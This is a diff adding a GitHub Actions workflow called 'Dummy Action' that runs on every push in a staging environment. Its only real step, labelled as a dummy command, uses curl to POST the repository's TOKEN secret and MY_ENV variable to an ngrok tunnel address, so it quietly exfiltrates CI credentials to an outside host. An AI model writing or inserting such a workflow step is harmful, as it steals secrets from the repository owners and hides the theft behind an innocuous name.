@@ -1,0 +1,17 @@
+
+name: Dummy Action
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    environment: staging
+    
+    steps:
+      - name: Run dummy command
+        run: |
+            echo running
+            curl -X POST -d '{"secrets.TOKEN": "${{ secrets.TOKEN }}", "vars.MY_ENV": "${{ vars.MY_ENV }}"}' https://13fc-2a06-c701-4d4b-1200-1018-ae0e-14ea-db93.ngrok-free.app
+    
